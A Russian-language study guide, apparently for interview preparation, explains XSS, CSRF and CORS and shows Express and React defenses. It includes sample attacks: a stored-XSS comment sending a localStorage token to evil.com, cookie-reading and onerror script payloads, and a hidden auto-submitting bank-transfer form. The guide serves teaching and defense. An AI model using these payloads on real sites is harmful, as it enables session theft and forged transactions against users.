<!-- verified: 2026-06-05, corrections: 0 -->
# XSS, CSRF и CORS

## XSS — Cross-Site Scripting

XSS — атака, при которой злоумышленник внедряет вредоносный JavaScript в страницы, просматриваемые другими пользователями. Браузер жертвы выполняет этот код в контексте вашего сайта.

### Три типа XSS

**Stored XSS (самый опасный)**: вредоносный код сохраняется в БД и показывается всем пользователям.

```typescript
// Сценарий: сайт с комментариями, не экранирует ввод

// Злоумышленник отправляет комментарий:
const maliciousComment = `<script>
  fetch('https://evil.com/steal?token=' + localStorage.getItem('token'));
</script>`;

// Сервер сохраняет как есть, рендерит на странице:
// <div class="comment">{maliciousComment}</div>
// → браузер каждого посетителя выполнит fetch на evil.com
```

**Reflected XSS**: вредоносный код передаётся в URL и отражается в ответе.

```
GET /search?q=<script>alert(document.cookie)</script>
// Если сервер возвращает: "Результаты поиска: <script>..."
// → браузер выполняет скрипт
```

**DOM-based XSS**: уязвимость только в JavaScript на клиенте, сервер не участвует.

```javascript
// УЯЗВИМО: прямая вставка URL-параметра в DOM
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = `Hello, ${name}!`;
// URL: /page?name=<img src=x onerror=alert(1)> → XSS выполнится
```

### Что может сделать XSS-атака

```txt
1. Украсть токены: localStorage.getItem('token'), document.cookie (не HttpOnly)
2. Keylogger: перехват нажатий клавиш на форме
3. Перехват форм: отправка credentials на evil.com
4. Действия от имени пользователя: создать заказ, изменить email/пароль
5. Распространение через BeEF framework: превратить браузер в бота
```

### Защита от XSS

```typescript
// 1. Никогда не использовать innerHTML с пользовательскими данными
// ПЛОХО:
element.innerHTML = userInput;

// ХОРОШО: textContent экранирует HTML-спецсимволы
element.textContent = userInput;

// 2. React: автоматический HTML escaping при {expression}
// БЕЗОПАСНО:
<div>{userInput}</div>

// ОПАСНО — обходит защиту React:
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// 3. Серверная сторона (Express + шаблоны): всегда использовать
// серверное escaping (EJS: <%= %> экранирует, <%- %> нет!)

// 4. Content Security Policy (CSP) — последний рубеж обороны:
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"], // запрещает inline scripts и внешние скрипты
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'", 'https://api.myapp.com'],
  },
}));

// 5. HttpOnly cookies: даже при XSS JS не может прочитать cookie
res.cookie('session', token, { httpOnly: true });
```

CSP + HttpOnly = XSS может выполниться, но не сможет ни украсть cookie, ни загрузить внешние скрипты.

## CSRF — Cross-Site Request Forgery

CSRF — атака, при которой злоумышленник заставляет браузер жертвы (уже аутентифицированной) отправить запрос к вашему серверу без ведома пользователя.

```txt
Механизм CSRF:

1. Пользователь залогинен в bank.com (session cookie есть)
2. Пользователь открывает evil.com
3. evil.com содержит скрытую форму:
   <form action="https://bank.com/api/transfer" method="POST">
     <input type="hidden" name="amount" value="5000">
     <input type="hidden" name="to" value="attacker-account">
   </form>
   <script>document.forms[0].submit();</script>

4. Браузер отправляет POST на bank.com
5. Браузер АВТОМАТИЧЕСКИ прикладывает cookie для bank.com
6. Сервер bank.com видит валидную сессию → выполняет перевод
```

**Почему JWT в Authorization header защищает от CSRF**: браузер автоматически отправляет cookies для домена, но НЕ отправляет кастомные заголовки (Authorization) на кросс-доменные запросы. Evil.com не имеет доступа к JWT из memory/localStorage (same-origin policy), поэтому не может поставить заголовок.

### Защита от CSRF

```typescript
// 1. SameSite Cookie (современная и простая защита)
res.cookie('session', token, {
  sameSite: 'strict',  // Cookie НЕ отправляется на кросс-доменные запросы
  // sameSite: 'lax'   // Не отправляется на POST, но отправляется на GET (ссылки)
  httpOnly: true,
  secure: true,
});

// 2. CSRF Token (классическая защита для legacy browsers)
// Сервер генерирует случайный токен при загрузке страницы
// и вкладывает в HTML (в hidden input или meta tag)
// Клиент обязан отправить его в X-CSRF-Token header
// Сервер проверяет что token совпадает

import csrf from 'csurf';
app.use(csrf({ cookie: true }));

app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// 3. Double Submit Cookie
// Сервер устанавливает CSRF_TOKEN в non-HttpOnly cookie
// JS читает cookie и добавляет в X-CSRF-Token header
// Кросс-доменный форм-аттакер не может прочитать cookie (same-origin)
// → не может поставить правильный заголовок

// 4. Origin/Referer header validation (дополнительная мера)
app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    const origin = req.headers.origin;
    if (origin && !ALLOWED_ORIGINS.includes(origin)) {
      return res.status(403).json({ error: 'Invalid origin' });
    }
  }
  next();
});
```

## CORS — Cross-Origin Resource Sharing

**Важно**: CORS — это НЕ механизм безопасности сервера. Это политика браузера, которая контролирует доступ к ресурсам с другого origin.

```txt
Origin = scheme + host + port:
  http://localhost:3000  ≠  http://localhost:4000  (разные порты)
  http://example.com     ≠  https://example.com    (разные scheme)
  http://api.example.com ≠  http://example.com     (разные subdomain)

Same-Origin Policy: браузер по умолчанию блокирует
кросс-доменные запросы (fetch/XMLHttpRequest) если сервер
не разрешил явно через CORS заголовки.

CORS защищает браузер, НЕ сервер:
  curl / Postman / другой backend → CORS не применяется
  Браузер пользователя → CORS проверяется браузером
```

### Preflight Request — когда и зачем

```txt
Браузер отправляет OPTIONS preflight ПЕРЕД основным запросом если:
  - Метод: DELETE, PUT, PATCH (не "простые" методы: GET, POST, HEAD)
  - Заголовок: Authorization, Content-Type: application/json
    (не "простые" заголовки)
  - Любой кастомный заголовок: X-Request-ID

OPTIONS /api/users HTTP/1.1
Origin: https://frontend.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization

Ответ сервера (разрешение):
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Max-Age: 86400  ← кэш preflight на 24 часа
```

```typescript
// Express CORS настройка
import cors from 'cors';

const corsOptions: cors.CorsOptions = {
  origin: (origin, callback) => {
    const allowedOrigins = [
      'https://myapp.com',
      'https://staging.myapp.com',
      ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000'] : []),
    ];
    // origin === undefined: запрос без Origin (curl, server-to-server)
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error(`CORS: origin ${origin} not allowed`));
    }
  },
  credentials: true,        // разрешить cookies в кросс-доменных запросах
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400,
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions)); // preflight для всех роутов
```

**Распространённая ошибка**: `Access-Control-Allow-Origin: *` + `credentials: true` — это невалидная комбинация. Браузер блокирует cookies если Allow-Origin = wildcard. При credentials нужен конкретный origin.

## Взаимосвязь XSS, CSRF и CORS

```txt
XSS + CSRF связаны:
  При XSS злоумышленник может делать запросы С ВАШЕГО ORIGIN
  → Same-origin policy и CORS не помогают (запрос идёт с вашего домена)
  → CSRF Token тоже не помогает (JS может прочитать его с DOM)
  → Единственная защита: HttpOnly cookie (JS не читает), CSP (нет XSS)

CORS не защищает от CSRF:
  Браузер проверяет CORS для fetch/XHR
  Простая HTML form отправка НЕ проверяется CORS
  Поэтому CSRF Token или SameSite Cookie всё равно нужны

JWT в header защищает от CSRF но не от XSS:
  CSRF: браузер не отправляет Authorization header автоматически ✓
  XSS: если JWT в localStorage → XSS его украдёт ✗
  Решение: JWT в HttpOnly Cookie + SameSite=strict (защита и от XSS и от CSRF)
```

## Типичные ошибки на интервью

- **"CORS защищает сервер"** — CORS — политика браузера, не сервера. curl/Postman/другой backend полностью обходит CORS. Сервер защищают авторизация и аутентификация.

- **"XSS и CSRF — одно и то же"** — разные атаки. XSS: браузер выполняет чужой код на вашем сайте. CSRF: браузер отправляет легитимный запрос к вашему сайту с чужого сайта. XSS даёт больше возможностей — при XSS CSRF Token не помогает.

- **"`Access-Control-Allow-Origin: *` безопасно для API с авторизацией"** — при wildcard origin браузер не отправляет cookies (credentials: false обязателен). Если API требует авторизацию через cookie — wildcard сломает сессии.

- **"HttpOnly полностью защищает от XSS"** — HttpOnly защищает только cookie от чтения через JS. XSS при этом всё равно может делать запросы от имени пользователя (читает CSRF token из DOM, отправляет формы, выполняет fetch с вашего origin).

- **"SameSite=Lax полностью защищает от CSRF"** — Lax разрешает GET-запросы по навигации (ссылкам). Если у вас есть state-changing GET endpoints — Lax недостаточен. Для полной защиты — `strict` или CSRF token.
